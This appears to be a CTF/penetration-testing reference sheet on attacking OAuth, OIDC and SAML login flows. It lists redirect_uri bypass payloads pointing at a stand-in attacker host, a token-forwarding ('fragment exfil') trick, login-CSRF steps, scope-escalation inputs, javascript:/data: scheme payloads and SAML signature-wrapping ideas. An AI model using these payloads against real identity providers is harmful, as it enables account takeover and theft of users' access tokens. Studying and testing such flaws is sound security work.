# OAuth / SSO flow — the redirect, state, and token surface

OAuth failures are flow bugs, not crypto bugs. The three stages —
`/authorize` → redirect → `/callback` (+ `/token`) — each has a checklist.

---

## 1. The flow map

```
client → GET idp/authorize?client_id&redirect_uri&response_type&scope&state&nonce
       → idp authenticates user → 302 redirect_uri?code=|token=|&state=
client → POST idp/token {code, client_id, client_secret, redirect_uri, grant_type}
       → access_token (+ id_token for OIDC)
client → GET api/me with Bearer token
```

## 2. `redirect_uri` validation — the account-takeover primitive

The code/token goes wherever `redirect_uri` points. Tests, cheapest first:

```
redirect_uri=https://attacker.tld/cb                    # open
redirect_uri=https://attacker.tld                       # exact-diff
redirect_uri=https://target.tld.attacker.tld/cb         # suffix
redirect_uri=https://target.attacker.tld/cb             # subdomain trick
redirect_uri=https://target.tld@attacker.tld/cb         # userinfo
redirect_uri=https://attacker.tld?u=target.tld          # param confusion
redirect_uri=https://target.tld/../..%2fattacker.tld    # traversal
redirect_uri=https://target.tld%2f%2fattacker.tld       # double-slash
redirect_uri=https%3a%2f%2fattacker.tld                 # encoded
redirect_uri=https://target.tld%23.attacker.tld         # fragment-confuse
redirect_uri=https://target.tld\.attacker.tld           # escaped dot
redirect_uri=https://target.tld:attacker.tld            # port
redirect_uri=javascript:alert(1)                        # scheme
redirect_uri=data:text/html,<script>...</script>        # scheme
redirect_uri=/%2f%2fattacker.tld                        # relative
redirect_uri=//attacker.tld                             # protocol-relative
redirect_uri=\\\\attacker.tld                           # backslash
redirect_uri=/\\/attacker.tld
redirect_uri=https:attacker.tld                          # missing //
redirect_uri=https:///attacker.tld                      # empty host
redirect_uri=https://target.tld.attacker.tld@evil.tld/  # host sandwich
redirect_uri=https://attacker.tld/?next=https://target.tld/cb  # open-redirect chain
```

**The open-redirect chain**: find an open redirect *on* target.tld
(`/r?url=`, `/go?to=`, `/redirect?next=`), set `redirect_uri` to it with
`url=https://attacker.tld` — the IdP validates only the outer URI.

**Fragment exfil**: if the server validates the host but the app then
uses the fragment — `redirect_uri=https://target.tld/cb#@attacker.tld`
or `?next=` inside the callback page — JS can read `location.hash`
containing `access_token=` and forward it.

## 3. `state` (CSRF) checks

- `state` **absent**: the callback binds whatever account the IdP said to
  whatever browser session arrives — **login CSRF**: attacker initiates
  `/authorize` *as themselves*, gets `code_A`, drops it into victim's
  `/callback` → victim's browser session is now logged in *as the
  attacker's IdP account* — the victim's actions land in the attacker's
  account; if the app merges profiles, the attacker's account now holds
  victim data.
- `state` present but not validated → same.
- `state` predictable / reused.
- `state` checked on some clients but not the mobile/alt one.

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/oauth/callback?code=AAAA&state=" \
  --evidence-regex 'Set-Cookie|session' --evidence-kind impact \
  --on-match confirms --on-miss inconclusive
```

## 4. `response_type` confusions

| Asked | Got | Bug |
|---|---|---|
| `code` | also `token` | app accepts implicit when it meant code |
| `token` (implicit) | `access_token` in `Location` fragment | token-in-URL leaks via Referer/history |
| `id_token` | unsigned id_token | claims unverified — forge sub/email |
| `code id_token` / `code token` | hybrid | downgrade to implicit |
| `none` | no response | DoS/fingerprint |

Implicit-flow tokens live in the fragment — but the *referer* on the
`/callback` page's subresources can carry the fragment when the page does
`location.replace(newUrl + location.hash)` or similar.

## 5. `scope` escalation

```
scope=openid profile email admin            # just ask
scope=* / scope=admin                       # wildcard
scope=read write                            # over-request
scope=openid+profile+email+admin            # plus-encoding
scope=openid%20profile%20admin              # url-encoded
scope=["openid","admin"]                    # JSON array where string expected
scope=openid&scope=admin                    # param pollution
```

If the consent screen is skipped for `prompt=none` or pre-authorized
clients, over-scoped tokens are minted silently.

## 6. `client_id` / `client_secret`

- `client_secret` in the SPA bundle / `git log` / `.env` → impersonate
  the client.
- `client_id` allowlist is per-redirect-uri — a *different* registered
  client may have a looser redirect pattern.
- `client_id` collision across providers (GitHub vs Google) → token
  replay across providers.

## 7. Token-side bugs

- `access_token` is a JWT → `jwt-deep.md` (alg confusion, weak secret,
  kid/jku).
- `id_token` verified for signature but not `aud` → token minted for
  another client accepted.
- `id_token` not verified at all — `decode()` only.
- `nonce` missing in the request but required — replay an id_token.
- Token validated for the wrong provider (Google token accepted where
  GitHub was expected) — cross-IdP confusion.

## 8. SAML — the XML surface

- Signature wrapping: signed `<Assertion>` alongside an unsigned evil
  one; the app reads the unsigned.
- `xmlsec` DTD → XXE (route `web-xxe`).
- `Recipient`/`Audience`/`InResponseTo`/`NotOnOrAfter` missing checks →
  token replay or cross-SP.
- `NameID` accepted without signature verification (dev mode).
- Response signed but Assertion unsigned (or vice versa).

## 9. CTF shapes

- The IdP is a mini service in the handout — read `authorize`/`token`
  handlers; the bug is usually in `redirect_uri` comparison code:
  `startswith`, `endswith`, `in`, or a regex with an unescaped `.`
- `state` is echoed but never stored server-side.
- `code` is single-use but **the token endpoint binds it to the wrong
  `client_id`** — replay a leaked code with your own client.
- The callback accepts `?access_token=` directly on GET (implicit
  through the back door).

## 10. Cross-links

- Open redirect for the `redirect_uri` chain → `skills/web-open-redirect/`
- JWT in `id_token`/`access_token` → `jwt-deep.md`
- The whole flow when the IdP is the challenge → `skills/web-oauth-sso/`
